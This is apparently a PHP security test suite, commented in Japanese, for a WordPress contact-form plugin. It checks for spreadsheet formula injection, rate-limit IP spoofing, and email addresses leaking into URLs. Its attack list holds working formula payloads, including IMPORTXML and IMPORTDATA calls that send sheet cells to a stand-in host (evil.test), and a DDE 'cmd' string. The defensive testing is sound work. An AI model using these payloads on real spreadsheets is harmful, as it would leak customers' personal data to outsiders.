<?php
/**
 * 個人情報の持ち出され方を検査する。
 *
 * 権限まわり（誰が一覧を読めるか）は security_test.php が見ている。
 * こちらは「権限を持った人の手元まで届いたあと、そこから漏れないか」を見る。
 *
 *  ① スプレッドシートへの数式インジェクション
 *     お客様の自由入力がそのまま Google スプレッドシートのセルに入る。
 *     先頭が = だと Google は数式として実行するため、IMPORTXML 等を書かれると
 *     同じシートに並んでいる他のお客様の氏名・電話・住所が外部へ送られる。
 *  ② レート制限のなりすまし回避
 *     回数制限の鍵にするIPを、送信者が自分で名乗れてはいけない。
 *  ③ メールアドレスをURLに載せない
 *     ブラウザの履歴・サーバーのアクセスログ・リファラに残るため。
 */
$GLOBALS['FAKE_STATE_FILE'] = __DIR__ . '/pii_state.json';
@unlink($GLOBALS['FAKE_STATE_FILE']);
require __DIR__ . '/wp_stub.php';
require dirname(__DIR__) . '/eamber-form/eamber-form.php';

$ng = 0;
function t($n, $g, $w) {
    global $ng; $ok = ($g === $w); if (!$ok) $ng++;
    printf("%s %s (got=%s)\n", $ok ? 'OK  ' : 'NG  ', $n, var_export($g, true));
}

echo "--- 1. スプレッドシートへ数式を書き込ませない ---\n";
/* 実際に効く攻撃文字列。IMPORTXML は開いた瞬間に外部へ取りに行く */
$attacks = array(
    '=IMPORTXML("https://evil.test/?x="&A1&B1&C1,"//a")',
    '+IMPORTDATA("https://evil.test/steal")',
    '-2+3+cmd|\' /C calc\'!A0',
    '@SUM(A1:A9)',
    "\tHYPERLINK(\"https://evil.test\",\"請求書\")",
);
foreach ($attacks as $i => $a) {
    $p = eaf_sheet_payload(array(
        'ptype' => 'other', 'name' => $a, 'company' => $a,
        'address_detail' => $a, 'details' => $a, 'detail' => $a, 'page_url' => $a,
    ));
    $bad = array();
    foreach (array('name', 'company', 'address_detail', 'details', 'detail', 'page_url') as $k) {
        $v = (string) $p[$k];
        if ($v !== '' && strpos("=+-@\t\r", $v[0]) !== false) $bad[] = $k;
    }
    t('攻撃' . ($i + 1) . ': 数式として始まる欄が無い', $bad, array());
}
/* 中身は消さない。担当者が読めなくなっては意味がない */
$p = eaf_sheet_payload(array('ptype' => 'other', 'name' => '=IMPORTXML("https://evil.test","//a")'));
t('元の文字列は残る', strpos($p['name'], 'IMPORTXML') !== false, true);
/* ふつうの入力は1文字も変えない */
$p2 = eaf_sheet_payload(array(
    'ptype' => 'other', 'name' => '山田 太郎', 'address_detail' => '丸の内1-2-3 ○○マンション101',
    'tel' => '090-1234-5678', 'company' => '株式会社サンプル電機',
));
t('氏名はそのまま',   $p2['name'], '山田 太郎');
t('住所はそのまま',   $p2['address_detail'], '丸の内1-2-3 ○○マンション101');
t('電話はそのまま',   $p2['tel'], '090-1234-5678');
t('会社名はそのまま', $p2['company'], '株式会社サンプル電機');
/* 自己診断：素通しなら検出できることを確かめる */
$raw = '=IMPORTXML("https://evil.test","//a")';
t('自己診断: 素の値は危険と判定される', strpos("=+-@\t\r", $raw[0]) !== false, true);

echo "\n--- 2. 回数制限のIPを名乗らせない ---\n";
$_SERVER['REMOTE_ADDR'] = '203.0.113.10';
$_SERVER['HTTP_X_FORWARDED_FOR'] = '198.51.100.99';
$_SERVER['HTTP_X_REAL_IP']       = '198.51.100.98';
$_SERVER['HTTP_CF_CONNECTING_IP'] = '198.51.100.97';
t('★送信者が名乗ったIPを信じない', eaf_client_ip(), '203.0.113.10');
/* 毎回ちがうIPを名乗って制限をすり抜けられないこと */
$seen = array();
for ($i = 0; $i < 5; $i++) {
    $_SERVER['HTTP_X_FORWARDED_FOR'] = '198.51.100.' . $i;
    $seen[eaf_client_ip()] = true;
}
t('何度名乗っても鍵は1つのまま', count($seen), 1);

/* リバースプロキシの内側にあると分かっている場合だけ、明示的に信じる。
   ★見出しは前のケースの値が残るので、毎回きれいにしてから確かめる */
unset($_SERVER['HTTP_CF_CONNECTING_IP'], $_SERVER['HTTP_X_REAL_IP'], $_SERVER['HTTP_X_FORWARDED_FOR']);
add_filter('eaf_trust_proxy', function () { return true; });
$_SERVER['HTTP_X_FORWARDED_FOR'] = '198.51.100.99';
t('明示的に許可したときだけ前段のIPを見る', eaf_client_ip(), '198.51.100.99');
/* Cloudflareの見出しがあればそちらを優先する */
$_SERVER['HTTP_CF_CONNECTING_IP'] = '198.51.100.97';
t('Cloudflareの見出しを優先する', eaf_client_ip(), '198.51.100.97');
unset($_SERVER['HTTP_CF_CONNECTING_IP']);
$GLOBALS['FAKE_HOOKS']['eaf_trust_proxy'] = array();
t('許可を外せば元に戻る', eaf_client_ip(), '203.0.113.10');
/* 名乗りが壊れていても落ちない */
add_filter('eaf_trust_proxy', function () { return true; });
$_SERVER['HTTP_X_FORWARDED_FOR'] = 'not-an-ip';
t('壊れた名乗りは無視して実IPに戻る', eaf_client_ip(), '203.0.113.10');
$GLOBALS['FAKE_HOOKS']['eaf_trust_proxy'] = array();
unset($_SERVER['HTTP_X_FORWARDED_FOR'], $_SERVER['HTTP_X_REAL_IP'], $_SERVER['HTTP_CF_CONNECTING_IP']);

echo "\n--- 3. メールアドレスをURLに載せない ---\n";
$GLOBALS['FAKE_IS_ADMIN'] = true;
update_option(EAF_OPT, eaf_sanitize_options(array('site_name' => '株式会社e.Amber')));
$php = PHP_BINARY;
$out = (string) shell_exec(escapeshellarg($php) . ' ' . escapeshellarg(__DIR__ . '/sec_case.php')
     . ' ' . escapeshellarg('eaf_test_mail') . ' ' . escapeshellarg('manage_options')
     . ' 0 ' . escapeshellarg('eaf_test_mail') . ' 2>&1');
t('自己診断: テスト送信まで到達している', strpos($out, '[redirect]') !== false, true);
t('★宛先がURLに残らない', strpos($out, 'to=') !== false, false);
t('★アドレスの断片も残らない', strpos($out, '%40') !== false || strpos($out, '@') !== false, false);
t('結果は伝わる', strpos($out, 'testmail=') !== false, true);

echo "\n--- 4. 出さないと決めたものを出していないか ---\n";
$GLOBALS['FAKE_IS_ADMIN'] = false;
$html = eaf_shortcode(array());
t('フォームに通知先メールを埋め込まない', strpos($html, 'notify_email') !== false, false);
t('フォームに連携の合言葉を埋め込まない', strpos($html, 'sheet_secret') !== false, false);
t('フォームに転記先URLを埋め込まない',   strpos($html, 'script.google.com') !== false, false);

echo "\n--- 5. 転記先は Google の書き込み口だけ（持ち出し先を差し替えられない） ---\n";
t('正規のURLは通る',
  eaf_sheet_url_ok('https://script.google.com/macros/s/AKfycb1234_-abc/exec'), true);
foreach (array(
    'https://evil.test/exec',
    'http://script.google.com/macros/s/abc/exec',
    'https://script.google.com.evil.test/macros/s/abc/exec',
    'https://script.google.com/macros/s/abc/exec?x=https://evil.test',
    'https://script.google.com/macros/s/abc/dev',
) as $u) {
    t('弾く: ' . $u, eaf_sheet_url_ok($u), false);
}

echo $ng ? "\n### 失敗 {$ng} 件\n" : "\n### すべて成功\n";
@unlink($GLOBALS['FAKE_STATE_FILE']);
exit($ng ? 1 : 0);
